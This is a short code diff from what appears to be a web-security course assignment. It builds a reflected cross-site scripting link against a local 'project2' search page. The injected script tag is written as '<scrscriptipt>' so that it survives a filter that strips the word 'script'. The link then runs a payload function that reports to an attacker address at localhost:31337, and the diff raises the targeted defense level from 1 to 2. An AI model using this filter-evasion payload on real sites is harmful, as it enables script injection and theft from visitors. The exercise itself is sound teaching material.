@@ -30,12 +30,12 @@ function payload(attacker) {
 }
 
 function makeLink(xssdefense, target, attacker) {
-    return target + "./search?csrfdefence=1&xssdefense=" + xssdefense.toString() + "&q=" + 
+    return target + "./search?xssdefense=" + xssdefense.toString() + "&csrfdefence=1&q=" + 
         encodeURIComponent("<scrscriptipt" + ">" + "var url = window.location.href.substring(\"http://127.0.0.1/project2/\".length); " + payload.toString() + ";payload(\"" + 
         attacker + "\");" + "<" + "/scrscriptipt" + ">");
 }
 
-var xssdefense = 1;
+var xssdefense = 2;
 var target = "http://localhost/project2/";
 var attacker = "http://localhost:31337/";
 
